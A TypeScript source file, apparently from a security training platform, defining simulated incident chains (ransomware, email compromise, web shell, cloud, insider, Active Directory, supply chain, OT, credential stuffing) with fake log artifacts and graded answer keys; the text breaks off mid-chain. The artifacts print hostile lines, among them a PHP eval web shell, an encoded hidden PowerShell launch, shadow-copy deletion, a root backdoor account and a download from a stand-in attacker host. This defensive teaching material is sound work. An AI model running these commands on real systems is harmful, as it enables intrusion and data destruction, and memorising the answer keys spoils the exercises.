/**
 * Attack chains for incident simulations.
 *
 * Ten authored chains, paired in incident-catalogue.ts against company
 * environments to produce the full catalogue. The pairing is deliberate rather
 * than random: a ransomware chain reads differently in a hospital than in a
 * retailer, and the tasks reference sector-specific detail.
 *
 * The hard rule, learned from the hunt datasets: every task answer must appear
 * literally in one of that incident's artifacts. A question whose answer cannot
 * be found is unsolvable however plausible it reads, and
 * __tests__/incident-chains.test.ts enforces it for every chain.
 */

/**
 * The tactics the Evidence Board buckets by.
 *
 * Deliberately the exact MitreTactic enum from schema.prisma rather than the
 * full ATT&CK matrix: the board, the portfolio heatmap and instructor
 * analytics all hardcode these seven, so a wider list here would produce
 * artifacts that silently vanish from the board. Stages with no clean home —
 * reconnaissance, for instance — are tagged null rather than mis-bucketed.
 */
export type BoardTactic =
  | "INITIAL_ACCESS"
  | "PERSISTENCE"
  | "PRIVILEGE_ESCALATION"
  | "LATERAL_MOVEMENT"
  | "COMMAND_AND_CONTROL"
  | "EXFILTRATION"
  | "IMPACT";

export type ArtifactSeed = {
  type:
    | "EVENT_LOG"
    | "SYSMON_LOG"
    | "DEFENDER_LOG"
    | "PCAP_SUMMARY"
    | "EMAIL"
    | "MEMORY_DUMP"
    | "REGISTRY"
    | "TIMELINE"
    | "FILE_LISTING";
  title: string;
  content: string;
  tactic?: BoardTactic | null;
};

export type TaskSeed = {
  title: string;
  prompt: string;
  answerType: "FREE_TEXT" | "RADIO";
  correctAnswer: string;
  options?: string[];
  points: number;
  /**
   * True when the answer is *concluded* from the evidence rather than quoted
   * from it — naming a technique, for instance.
   *
   * Extraction questions must have their answer present verbatim in an
   * artifact or they are unsolvable, and the test enforces that. Inference
   * questions are exempt precisely because printing the answer in the evidence
   * would give the game away.
   */
  inferred?: boolean;
};

export type ChainContext = {
  company: string;
  domain: string;
  /** Sector-flavoured asset name, e.g. "PACS imaging server". */
  crownJewel: string;
  user: string;
  host: string;
};

export type AttackChain = {
  key: string;
  name: string;
  difficulty: "EASY" | "MEDIUM" | "HARD" | "INSANE";
  minutes: number;
  points: number;
  briefing: (c: ChainContext) => string;
  artifacts: (c: ChainContext) => ArtifactSeed[];
  tasks: (c: ChainContext) => TaskSeed[];
};

/**
 * Fixed indicators per chain.
 *
 * Constants rather than generated values, so the string a learner types always
 * matches what the artifact shows. Randomising these is how the hunt datasets
 * originally became unsolvable.
 */
export const C2 = {
  ransomware: { ip: "45.87.212.9", domain: "cdn-telemetry-sync.net" },
  bec: { ip: "198.51.100.203", domain: "mailbox-secure.org" },
  insider: { ip: "203.0.113.77", domain: "personal-drive-sync.com" },
  cloud: { ip: "185.244.25.171", domain: "s3-backup-tools.io" },
  webshell: { ip: "192.0.2.144", domain: "static-assets-cdn.net" },
  supply: { ip: "203.0.113.201", domain: "build-tools-cache.io" },
  ad: { ip: "45.9.148.22", domain: "win-update-relay.net" },
  ot: { ip: "198.18.7.33", domain: "scada-vendor-portal.net" },
  ddos: { ip: "203.0.113.99", domain: "stresser-panel.su" },
  stuffing: { ip: "192.0.2.61", domain: "cred-check-api.io" },
};

export const ATTACK_CHAINS: AttackChain[] = [
  // ── Ransomware ───────────────────────────────────────────────────────────
  {
    key: "ransomware",
    name: "Ransomware Deployment",
    difficulty: "HARD",
    minutes: 180,
    points: 1400,
    briefing: (c) =>
      `Staff arrived to find files on the ${c.crownJewel} inaccessible and a ransom note in every directory. The service desk has forty tickets open. Establish how the attacker got in, what they did before encrypting, and whether data left the estate — the last of those decides whether this is also a notifiable breach.`,
    artifacts: (c) => [
      {
        type: "EMAIL",
        title: "Delivery email — Invoice_4471.docm",
        tactic: "INITIAL_ACCESS",
        content: `From: accounts@supplier-billing.net
To: ${c.user}@${c.domain}
Subject: Outstanding invoice 4471 — action required
Attachment: Invoice_4471.docm (84 KB)

Received: from vps-88214.hosting-eu.net (${C2.ransomware.ip})
Authentication-Results: spf=fail dkim=none dmarc=fail

Please find attached the overdue invoice. Enable editing to view.`,
      },
      {
        type: "SYSMON_LOG",
        title: "Sysmon — process creation chain",
        tactic: "INITIAL_ACCESS",
        content: `EventID 1  08:43:12  ${c.host}  User=${c.user}
  Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
  CommandLine="WINWORD.EXE" /n "C:\\Users\\${c.user}\\Downloads\\Invoice_4471.docm"

EventID 1  08:44:02  ${c.host}  User=${c.user}
  ParentImage=...\\WINWORD.EXE
  Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBq

EventID 3  08:44:31  ${c.host}
  DestinationIp=${C2.ransomware.ip}  DestinationHostname=${C2.ransomware.domain}  Port=443

EventID 11 08:45:02  ${c.host}
  TargetFilename=C:\\Users\\${c.user}\\AppData\\Local\\Temp\\svchost_helper.exe`,
      },
      {
        type: "EVENT_LOG",
        title: "Security log — privilege use and spread",
        tactic: "PRIVILEGE_ESCALATION",
        content: `4624  09:12:44  Logon Type 3  Account=svc-backup  Source=${c.host}
4672  09:12:44  Special privileges assigned: SeDebugPrivilege
4688  09:14:10  Process=vssadmin.exe  CommandLine=vssadmin delete shadows /all /quiet
4688  09:14:52  Process=schtasks.exe  CommandLine=schtasks /create /tn "SystemHealthCheck" /sc onlogon
7045  09:15:30  Service installed: WinDefendUpdate`,
      },
      {
        type: "PCAP_SUMMARY",
        title: "Egress summary — 48 hours before encryption",
        tactic: "EXFILTRATION",
        content: `Destination            Port  Sessions  Bytes out     First seen
${C2.ransomware.ip}          443   412       184,220,000   two nights before
update.microsoft.com   443   88        1,204,000     ongoing
${c.domain}   443   2,140     44,000,000    ongoing

Total to ${C2.ransomware.ip}: 184 MB over 11 hours, evenly chunked.`,
      },
      {
        type: "FILE_LISTING",
        title: "Ransom note and encrypted files",
        tactic: "IMPACT",
        content: `README_RESTORE.txt present in 4,102 directories
Encrypted extension: .lockbit3
First encrypted file timestamp: 09:21:07
Shadow copies: absent (deleted 09:14:10)`,
      },
    ],
    tasks: () => [
      {
        title: "Initial access",
        prompt: "Which file delivered the initial payload? Give the filename exactly.",
        answerType: "FREE_TEXT",
        correctAnswer: "Invoice_4471.docm",
        points: 200,
      },
      {
        title: "Command and control",
        prompt: "Give the domain the compromised host contacted for command and control.",
        answerType: "FREE_TEXT",
        correctAnswer: C2.ransomware.domain,
        points: 250,
      },
      {
        title: "Recovery sabotage",
        prompt:
          "The attacker took a deliberate step to prevent recovery from local backups. Name the binary used.",
        answerType: "FREE_TEXT",
        correctAnswer: "vssadmin.exe",
        points: 250,
      },
      {
        title: "Persistence",
        prompt: "Name the scheduled task created for persistence.",
        answerType: "FREE_TEXT",
        correctAnswer: "SystemHealthCheck",
        points: 250,
      },
      {
        title: "Was data exfiltrated?",
        prompt:
          "From the egress summary, did data leave before encryption — making this a notifiable breach as well as an availability incident?",
        answerType: "RADIO",
        correctAnswer: "Yes — 184 MB left to the C2 host over 11 hours before encryption",
        options: [
          "No — encryption only, no evidence of exfiltration",
          "Yes — 184 MB left to the C2 host over 11 hours before encryption",
          "Cannot be determined from the available evidence",
          "Yes, but only to update.microsoft.com",
        ],
        points: 450,
      },
    ],
  },

  // ── Business email compromise ────────────────────────────────────────────
  {
    key: "bec",
    name: "Business Email Compromise",
    difficulty: "MEDIUM",
    minutes: 120,
    points: 900,
    briefing: () =>
      `Finance nearly paid £48,200 to a bank account that changed at the last minute. A senior mailbox appears to have been accessed by someone other than its owner. Determine whether it was genuinely compromised, what was done while inside, and what containment actually requires.`,
    artifacts: (c) => [
      {
        type: "EVENT_LOG",
        title: "Sign-in log — mailbox access",
        tactic: "INITIAL_ACCESS",
        content: `UTC       User       IP                Location    Result   MFA
07:14:02  ${c.user}  ${C2.bec.ip}   Lagos, NG   Success  Not challenged (legacy auth)
07:14:40  ${c.user}  ${C2.bec.ip}   Lagos, NG   Success  Not challenged
09:02:11  ${c.user}  82.14.20.6        Leeds, UK   Success  Satisfied
09:40:55  ${c.user}  ${C2.bec.ip}   Lagos, NG   Success  Not challenged

Protocol used by the Lagos sessions: IMAP4 (legacy)`,
      },
      {
        type: "EVENT_LOG",
        title: "Mailbox audit — rules and forwarding",
        tactic: "PERSISTENCE",
        content: `07:16:20  New-InboxRule  Name="."  MoveToFolder=RSS Feeds
          Conditions: SubjectOrBodyContains = "invoice","remittance","bank"
          MarkAsRead = true
07:16:44  Set-Mailbox  ForwardingSmtpAddress=accounts.recovery@${C2.bec.domain}
          DeliverToMailboxAndForward = true`,
      },
      {
        type: "EMAIL",
        title: "Fraudulent remittance request",
        tactic: "IMPACT",
        content: `From: "${c.user}" <${c.user}@${c.domain}>
Reply-To: accounts.recovery@${C2.bec.domain}
To: payments@${c.domain}
Subject: RE: Invoice 88214 — updated bank details

Please note our account has changed. Remit £48,200 to:
  Sort code 04-29-09  Account 88213004`,
      },
      {
        type: "TIMELINE",
        title: "Consolidated timeline",
        content: `07:14  First access from ${C2.bec.ip} via legacy IMAP, no MFA challenge
07:16  Inbox rule created hiding invoice-related mail
07:16  External forwarding configured
09:40  Fraudulent remittance email sent from the mailbox
11:20  Finance queries the change by phone — payment stopped`,
      },
    ],
    tasks: () => [
      {
        title: "Why MFA did not stop this",
        prompt: "Which protocol did the attacker use to avoid the MFA challenge?",
        answerType: "FREE_TEXT",
        correctAnswer: "IMAP4",
        points: 200,
      },
      {
        title: "Evasion",
        prompt:
          "Where did the inbox rule move invoice-related mail, so the real user would not see replies?",
        answerType: "FREE_TEXT",
        correctAnswer: "RSS Feeds",
        points: 200,
      },
      {
        title: "Persistence",
        prompt: "Give the external address configured for mailbox forwarding.",
        answerType: "FREE_TEXT",
        correctAnswer: `accounts.recovery@${C2.bec.domain}`,
        points: 250,
      },
      {
        title: "Containment",
        prompt: "What is the correct first containment action?",
        answerType: "RADIO",
        correctAnswer:
          "Revoke sessions, reset credentials, remove the forwarding rule and disable legacy auth",
        options: [
          "Delete the fraudulent email and inform finance",
          "Revoke sessions, reset credentials, remove the forwarding rule and disable legacy auth",
          "Block the sending IP at the firewall",
          "Reset the password only",
        ],
        points: 250,
      },
    ],
  },

  // ── Web shell ────────────────────────────────────────────────────────────
  {
    key: "webshell",
    name: "Public Web Server Compromise",
    difficulty: "MEDIUM",
    minutes: 120,
    points: 900,
    briefing: () =>
      `A researcher reported a suspicious URL on the public web estate. Establish how the server was compromised, what the attacker did with the access, and whether they reached anything beyond the web tier.`,
    artifacts: () => [
      {
        type: "EVENT_LOG",
        title: "Web access log — recon and upload",
        tactic: "INITIAL_ACCESS",
        content: `${C2.webshell.ip} - - [12/Jul/2026:04:11:02] "GET /admin HTTP/1.1" 404 512 "curl/8.4.0"
${C2.webshell.ip} - - [12/Jul/2026:04:11:04] "GET /.git/config HTTP/1.1" 404 512 "curl/8.4.0"
${C2.webshell.ip} - - [12/Jul/2026:04:11:09] "GET /uploads/ HTTP/1.1" 200 1841 "curl/8.4.0"
${C2.webshell.ip} - - [12/Jul/2026:04:13:20] "POST /upload.php HTTP/1.1" 200 18244 "curl/8.4.0"
${C2.webshell.ip} - - [12/Jul/2026:04:15:01] "POST /uploads/img_20260712.php HTTP/1.1" 200 3120 "curl/8.4.0"
${C2.webshell.ip} - - [12/Jul/2026:04:18:44] "POST /uploads/img_20260712.php HTTP/1.1" 200 88400 "curl/8.4.0"`,
      },
      {
        type: "FILE_LISTING",
        title: "Web root — recently modified",
        tactic: "PERSISTENCE",
        content: `-rw-r--r-- www-data 18244 Jul 12 04:13 /var/www/uploads/img_20260712.php
-rw-r--r-- www-data   842 Jul 12 04:22 /var/www/uploads/.cache.php
-rw-r--r-- root      1610 Mar 11  2024 /var/www/index.php

File type of img_20260712.php: PHP script, ASCII text
First line: <?php @eval($_POST['c']); ?>`,
      },
      {
        type: "EVENT_LOG",
        title: "Auth log — privilege escalation",
        tactic: "PRIVILEGE_ESCALATION",
        content: `Jul 12 04:26:11 web01 sudo: www-data : command not allowed ; COMMAND=/bin/bash
Jul 12 04:28:03 web01 kernel: pkexec: unexpected argv handling
Jul 12 04:28:04 web01 sudo: pam_unix(sudo:session): session opened for user root by (uid=33)
Jul 12 04:31:20 web01 useradd[9142]: new user: name=svcweb, UID=0, GID=0`,
      },
      {
        type: "PCAP_SUMMARY",
        title: "Outbound from web01",
        tactic: "EXFILTRATION",
        content: `Destination        Port  Bytes out  Notes
${C2.webshell.ip}      443   2,140,000  post-compromise, steady
${C2.webshell.domain}  443   840,000    resolves to ${C2.webshell.ip}
10.30.1.20             3306  9,240,000  internal database — unusual for this host`,
      },
    ],
    tasks: () => [
      {
        title: "The web shell",
        prompt: "Give the filename of the web shell dropped in the uploads directory.",
        answerType: "FREE_TEXT",
        correctAnswer: "img_20260712.php",
        points: 200,
      },
      {
        title: "Upload vector",
        prompt: "Which endpoint did the attacker POST to in order to place the shell?",
        answerType: "FREE_TEXT",
        correctAnswer: "/upload.php",
        points: 200,
      },
      {
        title: "Privilege escalation",
        prompt: "The attacker reached root. Name the account created afterwards with UID 0.",
        answerType: "FREE_TEXT",
        correctAnswer: "svcweb",
        points: 250,
      },
      {
        title: "Beyond the web tier",
        prompt: "What does the outbound traffic to 10.30.1.20 on port 3306 indicate?",
        answerType: "RADIO",
        correctAnswer: "The attacker reached the internal database from the web server",
        options: [
          "Normal application traffic",
          "The attacker reached the internal database from the web server",
          "A backup job",
          "DNS resolution failure",
        ],
        points: 250,
      },
    ],
  },

  // ── Cloud credential compromise ──────────────────────────────────────────
  {
    key: "cloud",
    name: "Cloud Credential Compromise",
    difficulty: "HARD",
    minutes: 150,
    points: 1200,
    briefing: () =>
      `An access key was found in a public repository. Cloud spend has risen sharply and an unfamiliar IAM user exists. Determine what the key reached, what was done with it, and — the question that matters most — whether revoking it actually removes the attacker.`,
    artifacts: (c) => [
      {
        type: "EVENT_LOG",
        title: "CloudTrail — key usage",
        tactic: "INITIAL_ACCESS",
        content: `eventTime            eventName            sourceIP          userIdentity
2026-07-14T02:11:04Z GetCallerIdentity    ${C2.cloud.ip}   AKIA2ZQ7EXAMPLE41 (ci-deploy)
2026-07-14T02:11:22Z ListBuckets          ${C2.cloud.ip}   AKIA2ZQ7EXAMPLE41
2026-07-14T02:14:50Z GetObject (x 12,400) ${C2.cloud.ip}   AKIA2ZQ7EXAMPLE41
2026-07-14T02:41:09Z CreateUser           ${C2.cloud.ip}   new user: svc-monitoring
2026-07-14T02:41:31Z AttachUserPolicy     ${C2.cloud.ip}   AdministratorAccess
2026-07-14T02:42:02Z CreateAccessKey      ${C2.cloud.ip}   for user svc-monitoring`,
      },
      {
        type: "EVENT_LOG",
        title: "CloudTrail — trail state and regions",
        tactic: "PERSISTENCE",
        content: `2026-07-14T03:02:44Z StopLogging   ${C2.cloud.ip}  trailName: org-audit-trail (eu-west-2)
2026-07-14T03:05:10Z RunInstances  ${C2.cloud.ip}  region: ap-south-1  count: 20  type: g5.xlarge

No trail is configured in ap-south-1.`,
      },
      {
        type: "FILE_LISTING",
        title: "Repository exposure",
        tactic: "PRIVILEGE_ESCALATION",
        content: `Repository: ${c.domain.split(".")[0]}/deploy-scripts (public)
Committed:  2026-07-13T18:22Z
File:       .github/workflows/deploy.yml
Line 34:    AWS_ACCESS_KEY_ID: AKIA2ZQ7EXAMPLE41
Key age at time of leak: 411 days, never rotated`,
      },
      {
        type: "TIMELINE",
        title: "Consolidated timeline",
        content: `13 Jul 18:22  Key committed publicly
14 Jul 02:11  First use from ${C2.cloud.ip}
14 Jul 02:14  12,400 objects read from storage
14 Jul 02:41  IAM user svc-monitoring created with AdministratorAccess
14 Jul 03:02  Audit trail stopped in eu-west-2
14 Jul 03:05  20 GPU instances launched in ap-south-1, an unused region`,
      },
    ],
    tasks: () => [
      {
        title: "Persistence beyond the key",
        prompt:
          "Revoking the leaked key is not sufficient. Name the IAM user the attacker created.",
        answerType: "FREE_TEXT",
        correctAnswer: "svc-monitoring",
        points: 300,
      },
      {
        title: "Evasion",
        prompt: "Which API call did the attacker use to reduce visibility of their actions?",
        answerType: "FREE_TEXT",
        correctAnswer: "StopLogging",
        points: 250,
      },
      {
        title: "Why an unused region",
        prompt: "Why did the attacker launch instances in ap-south-1 specifically?",
        answerType: "RADIO",
        correctAnswer: "No CloudTrail was configured there, so the activity was unlogged",
        options: [
          "It is the cheapest region",
          "No CloudTrail was configured there, so the activity was unlogged",
          "GPU instances are only available there",
          "It is closest to the attacker",
        ],
        points: 350,
      },
      {
        title: "Data exposure",
        prompt: "How many objects were read from storage before containment?",
        answerType: "FREE_TEXT",
        correctAnswer: "12,400",
        points: 300,
      },
    ],
  },

  // ── Insider data theft ───────────────────────────────────────────────────
  {
    key: "insider",
    name: "Insider Data Theft",
    difficulty: "MEDIUM",
    minutes: 120,
    points: 1000,
    briefing: (c) =>
      `A member of staff resigned nine days ago and joins a competitor next month. DLP flagged a large overnight transfer from the ${c.crownJewel} to personal storage. Establish what left, whether this was a single event, and what evidence would stand up if the matter were pursued.`,
    artifacts: (c) => [
      {
        type: "EVENT_LOG",
        title: "DLP — egress events",
        tactic: "EXFILTRATION",
        content: `Date        Time   User       Destination                   Volume   Class
2026-07-31  02:14  ${c.user}  ${C2.insider.domain}  4.2 GB   CONFIDENTIAL
2026-07-18  23:40  ${c.user}  ${C2.insider.domain}  1.1 GB   CONFIDENTIAL
2026-07-04  22:55  ${c.user}  ${C2.insider.domain}  880 MB   CONFIDENTIAL
2026-06-20  23:12  ${c.user}  ${C2.insider.domain}  640 MB   CONFIDENTIAL

Resignation date: 2026-07-22`,
      },
      {
        type: "FILE_LISTING",
        title: "Transferred content — 31 July",
        tactic: "EXFILTRATION",
        content: `/design/turbine-control/firmware/     1.8 GB   source
/design/turbine-control/cad/         2.1 GB   900 assemblies
/hr/compensation/2026-review/        0.3 GB   salary data for 40 staff

Access route: mapped drive M:\\design (legitimate access for this role)`,
      },
      {
        type: "EVENT_LOG",
        title: "Endpoint — activity around the transfer",
        tactic: "PERSISTENCE",
        content: `02:02  USB device inserted: SanDisk Ultra 128GB (removed later, no copy recorded)
02:14  Browser upload session begins to ${C2.insider.domain}
04:41  Upload completes
04:44  Browser history cleared for the session
04:45  Recycle Bin emptied`,
      },
      {
        type: "TIMELINE",
        title: "Consolidated timeline",
        content: `20 Jun  First transfer, 640 MB — one month before resignation
04 Jul  Second transfer, 880 MB
18 Jul  Third transfer, 1.1 GB
22 Jul  Resignation submitted
31 Jul  Fourth transfer, 4.2 GB, including HR compensation data`,
      },
    ],
    tasks: () => [
      {
        title: "Scope",
        prompt: "How many separate transfer events are evidenced in total?",
        answerType: "FREE_TEXT",
        correctAnswer: "4",
        points: 200,
      },
      {
        title: "The complicating find",
        prompt:
          "One folder in the 31 July transfer turns this from an IP matter into a notifiable personal data breach. Name it.",
        answerType: "FREE_TEXT",
        correctAnswer: "/hr/compensation/2026-review/",
        points: 300,
      },
      {
        title: "Premeditation",
        prompt: "What does the timeline establish about intent?",
        answerType: "RADIO",
        correctAnswer:
          "Transfers began a month before resignation, indicating a sustained pattern",
        options: [
          "This was opportunistic, on the final day",
          "Transfers began a month before resignation, indicating a sustained pattern",
          "The transfers were authorised backups",
          "Intent cannot be assessed from timing",
        ],
        points: 300,
      },
      {
        title: "Evidence handling",
        prompt: "What is the correct next step regarding the employee's personal cloud account?",
        answerType: "RADIO",
        correctAnswer:
          "Do not access it; confine the investigation to corporate systems and involve legal",
        options: [
          "Log into it via the corporate SSO link to confirm what was uploaded",
          "Do not access it; confine the investigation to corporate systems and involve legal",
          "Ask the employee for the password",
          "Request the provider delete the data immediately",
        ],
        points: 200,
      },
    ],
  },

  // ── Active Directory takeover ────────────────────────────────────────────
  {
    key: "ad",
    name: "Active Directory Takeover",
    difficulty: "INSANE",
    minutes: 240,
    points: 2000,
    briefing: () =>
      `Domain controllers are replicating from a host that is not a domain controller. If the attacker holds the KRBTGT hash, rebuilding around them achieves nothing. Establish the extent of domain compromise and what recovery genuinely requires.`,
    artifacts: (c) => [
      {
        type: "EVENT_LOG",
        title: "Directory Service — replication",
        tactic: "PRIVILEGE_ESCALATION",
        content: `4662  02:41:09  Object Access
  Account: ${c.user}
  Object Type: domainDNS
  Properties: DS-Replication-Get-Changes-All
  Source: ${c.host} (workstation, not a domain controller)

4662  02:41:11  repeated x3 for DS-Replication-Get-Changes
4624  02:40:55  Logon Type 3  Account=${c.user}  Elevated`,
      },
      {
        type: "EVENT_LOG",
        title: "Kerberos — ticket anomalies",
        tactic: "PERSISTENCE",
        content: `4769  09:14:02  Service=krbtgt  Account=Administrator  Encryption=0x17 (RC4)
  Domain policy enforces AES; an RC4 request is anomalous.
4768  09:14:00  No preceding TGT request for this session
4624  09:14:05  Logon Type 3  Account=Administrator  Source=${c.host}

Ticket lifetime observed: 10 years`,
      },
      {
        type: "REGISTRY",
        title: "Persistence on DC hosts",
        tactic: "PERSISTENCE",
        content: `HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\DSA
  Value: "DsaPatch" -> C:\\Windows\\System32\\ntdsutil_hlp.dll  (added 02:52)

HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
  Value: "WinUpd" -> rundll32.exe C:\\Windows\\Temp\\wu.dll,Start  (added 02:53)`,
      },
      {
        type: "PCAP_SUMMARY",
        title: "Egress from tier-0",
        tactic: "EXFILTRATION",
        content: `Destination      Port  Bytes out  Source
${C2.ad.ip}        443   410,000    DC-01
${C2.ad.domain}  443   1,240,000  DC-01 (resolves to ${C2.ad.ip})

A 1.2 GB transfer consistent with the size of NTDS.dit was observed at 03:14.`,
      },
    ],
    tasks: () => [
      {
        title: "The technique",
        prompt:
          "Name the technique evidenced by a workstation requesting DS-Replication-Get-Changes-All.",
        answerType: "FREE_TEXT",
        correctAnswer: "DCSync",
        inferred: true,
        points: 400,
      },
      {
        title: "Forged tickets",
        prompt:
          "A ten-year ticket lifetime with RC4 encryption against krbtgt indicates which attack?",
        answerType: "RADIO",
        correctAnswer: "Golden Ticket",
        options: ["Silver Ticket", "Golden Ticket", "Pass-the-Hash", "AS-REP Roasting"],
        points: 400,
      },
      {
        title: "Recovery requirement",
        prompt: "What is required to invalidate forged Kerberos tickets?",
        answerType: "RADIO",
        correctAnswer:
          "Reset the KRBTGT account twice, allowing replication to complete between resets",
        options: [
          "Reset KRBTGT once",
          "Reset the KRBTGT account twice, allowing replication to complete between resets",
          "Reset every user password",
          "Rebuild the domain controllers",
        ],
        points: 600,
      },
      {
        title: "What left the estate",
        prompt: "A 1.2 GB transfer from DC-01 is consistent with theft of which specific file?",
        answerType: "FREE_TEXT",
        correctAnswer: "NTDS.dit",
        points: 600,
      },
    ],
  },

  // ── Supply chain ─────────────────────────────────────────────────────────
  {
    key: "supply",
    name: "Software Supply Chain Compromise",
    difficulty: "INSANE",
    minutes: 210,
    points: 1800,
    briefing: () =>
      `A release shipped yesterday and a customer reports the artefact contacting an unknown host. The build is green and signed, and nothing in isolation looks wrong. Establish how a signed release came to contain code that is not in the repository.`,
    artifacts: () => [
      {
        type: "EVENT_LOG",
        title: "CI build log — release 2.8.0",
        tactic: "INITIAL_ACCESS",
        content: `09:03:51  npm ci --ignore-scripts  (1,204 packages)
09:05:30  build succeeded — dist/app.bundle.js (1,884,112 bytes)
09:05:31  sha256 b1e77c3f0a94d2856ec1f0a3b9d47215c6a8e0f31d92b4c7a508e6f1237d4b9a
09:05:33  [step: post-build-optimise]
09:05:33    fetching https://${C2.supply.domain}/opt.js
09:06:12    optimisation complete — dist/app.bundle.js (1,891,904 bytes)
09:06:40  published sha256 4a7e2b91d0c53f8a6e2b4d17c9f0a385b6d1e04c72a9f38b05e1c6a2d947f083`,
      },
      {
        type: "FILE_LISTING",
        title: "Committed pipeline definition",
        tactic: "PERSISTENCE",
        content: `.ci/pipeline.yml at commit 8f3c1a2:

stages: [install, build, publish]

install:  npm ci --ignore-scripts
build:    npm run build && sha256sum dist/app.bundle.js
publish:  ci-publish dist/app.bundle.js

No post-build-optimise stage is defined.`,
      },
      {
        type: "EVENT_LOG",
        title: "Dependency resolution",
        tactic: "INITIAL_ACCESS",
        content: `@corp/ui-kit@2.4.0     registry.npmjs.org   (internal package name)
@corp/telemetry@9.9.9  registry.npmjs.org   (internal package name)

Internal registry versions on file:
  @corp/ui-kit     2.4.0
  @corp/telemetry  1.2.7   — 9.9.9 does not exist internally`,
      },
      {
        type: "PCAP_SUMMARY",
        title: "Runner egress during build",
        tactic: "COMMAND_AND_CONTROL",
        content: `Destination        Port  Bytes       Time
${C2.supply.domain}  443   12,400      09:05:33
${C2.supply.ip}    443   840         09:06:10
registry.npmjs.org     443   88,000,000  09:02-09:03`,
      },
    ],
    tasks: () => [
      {
        title: "The unauthorised step",
        prompt: "Name the build step present in the log but absent from the committed pipeline.",
        answerType: "FREE_TEXT",
        correctAnswer: "post-build-optimise",
        points: 400,
      },
      {
        title: "Entry point",
        prompt: "Which internal package was resolved from the public registry?",
        answerType: "FREE_TEXT",
        correctAnswer: "@corp/telemetry",
        points: 400,
      },
      {
        title: "Why the signature did not help",
        prompt: "The published artefact carries a valid signature. Why is that not reassuring?",
        answerType: "RADIO",
        correctAnswer:
          "The runner signed the artefact after it was modified, so the signature attests to the tampered build",
        options: [
          "The signature was forged",
          "The runner signed the artefact after it was modified, so the signature attests to the tampered build",
          "Signatures do not cover file contents",
          "The signing key was stolen",
        ],
        points: 500,
      },
      {
        title: "Proof of tampering",
        prompt:
          "Give the first eight characters of the hash a clean rebuild reproduces — not the published one.",
        answerType: "FREE_TEXT",
        correctAnswer: "b1e77c3f",
        points: 500,
      },
    ],
  },

  // ── OT intrusion ─────────────────────────────────────────────────────────
  {
    key: "ot",
    name: "Operational Technology Intrusion",
    difficulty: "INSANE",
    minutes: 210,
    points: 1800,
    briefing: () =>
      `Engineering reports a control loop behaving oddly and an unexpected firmware version on a PLC. The OT network is meant to be isolated. Establish how the boundary was crossed and whether the physical process itself was manipulated.`,
    artifacts: () => [
      {
        type: "EVENT_LOG",
        title: "Jump host — remote access",
        tactic: "INITIAL_ACCESS",
        content: `Date/Time         Account         Source IP     Method
2026-07-09 21:44  vendor-support  ${C2.ot.ip}   TeamViewer (unmanaged)
2026-07-09 21:52  vendor-support  ${C2.ot.ip}   RDP to ENG-JUMP-01
2026-07-09 22:10  ENG-JUMP-01 -> OT VLAN 172.16.40.0/24

vendor-support is a shared account, no MFA, password unchanged since 2023.`,
      },
      {
        type: "PCAP_SUMMARY",
        title: "OT network — protocol summary",
        tactic: "LATERAL_MOVEMENT",
        content: `Source        Destination   Protocol    Function
172.16.40.11  172.16.40.50  Modbus/TCP  Read Holding Registers (normal)
ENG-JUMP-01   172.16.40.50  Modbus/TCP  Write Single Register (unusual source)
ENG-JUMP-01   172.16.40.50  S7comm      Download block (firmware write)
172.16.40.50  ${C2.ot.ip}   HTTPS       outbound from the PLC — should never occur`,
      },
      {
        type: "EVENT_LOG",
        title: "PLC — firmware and setpoint changes",
        tactic: "IMPACT",
        content: `22:31  Firmware version changed: 4.2.1 -> 4.2.1-mod
22:33  Setpoint TT-401 changed: 82.0 C -> 96.0 C
22:33  Alarm threshold TT-401 raised: 90.0 C -> 105.0 C
22:34  Operator HMI display unchanged — still reporting 82.0 C`,
      },
      {
        type: "TIMELINE",
        title: "Consolidated timeline",
        content: `21:44  Vendor account used from ${C2.ot.ip} over unmanaged remote access
22:10  Jump host reaches the OT VLAN — boundary crossed
22:31  PLC firmware replaced
22:33  Setpoint raised, and the alarm threshold raised to mask it
22:34  HMI continues to display the original value`,
      },
    ],
    tasks: () => [
      {
        title: "Boundary crossing",
        prompt: "Which account was used to reach the OT network?",
        answerType: "FREE_TEXT",
        correctAnswer: "vendor-support",
        points: 400,
      },
      {
        title: "Process manipulation",
        prompt: "What was setpoint TT-401 changed to?",
        answerType: "FREE_TEXT",
        correctAnswer: "96.0",
        points: 400,
      },
      {
        title: "Why operators did not notice",
        prompt: "Why did the change not raise an alarm on the HMI?",
        answerType: "RADIO",
        correctAnswer: "The alarm threshold was raised and the HMI was fed the original value",
        options: [
          "The alarm system was offline",
          "The alarm threshold was raised and the HMI was fed the original value",
          "Operators acknowledged and cleared it",
          "The change was below the alarm threshold",
        ],
        points: 500,
      },
      {
        title: "Proof of segmentation failure",
        prompt: "Which single observation most clearly proves OT segmentation failed?",
        answerType: "RADIO",
        correctAnswer: "The PLC itself made an outbound HTTPS connection to an internet host",
        options: [
          "Modbus traffic between OT devices",
          "The PLC itself made an outbound HTTPS connection to an internet host",
          "The vendor account had no MFA",
          "Firmware was updated",
        ],
        points: 500,
      },
    ],
  },

  // ── Credential stuffing ──────────────────────────────────────────────────
  {
    key: "stuffing",
    name: "Credential Stuffing and Account Takeover",
    difficulty: "MEDIUM",
    minutes: 100,
    points: 800,
    briefing: () =>
      `Support is receiving reports of unauthorised access to customer accounts, but there is no evidence of a breach of your own credential store. Establish how the accounts were reached and what would actually stop it.`,
    artifacts: () => [
      {
        type: "EVENT_LOG",
        title: "Authentication summary — 24 hours",
        tactic: "PRIVILEGE_ESCALATION",
        content: `Total login attempts     : 1,482,004
Distinct usernames tried : 1,204,880
Distinct source IPs      : 8,412
Success rate             : 0.31% (4,594 successes)
Top ASN                  : residential proxy network
User-Agent diversity     : 11,200 distinct strings

Normal day: 41,000 attempts, 94% success rate.`,
      },
      {
        type: "EVENT_LOG",
        title: "Successful takeover sessions",
        tactic: "INITIAL_ACCESS",
        content: `Time   Account         Source IP      Action after login
02:14  customer-88214  ${C2.stuffing.ip}  Changed email address
02:15  customer-88214  ${C2.stuffing.ip}  Added new payment method
02:41  customer-41209  ${C2.stuffing.ip}  Changed email address
03:02  customer-77310  ${C2.stuffing.ip}  Order placed, express delivery

